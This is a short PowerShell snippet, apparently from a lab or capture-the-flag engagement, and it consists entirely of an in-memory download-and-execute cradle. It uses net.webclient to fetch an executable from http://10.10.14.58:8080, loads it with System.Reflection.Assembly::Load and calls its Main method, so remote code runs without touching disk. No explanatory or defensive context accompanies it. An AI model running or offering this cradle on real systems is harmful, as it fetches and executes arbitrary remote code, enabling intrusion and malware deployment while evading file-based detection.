$bytes = (new-object net.webclient).downloaddata('http://10.10.14.58:8080/rasta8888.exe')
[System.Reflection.Assembly]::Load($bytes)
[Reflection.Program]::Main()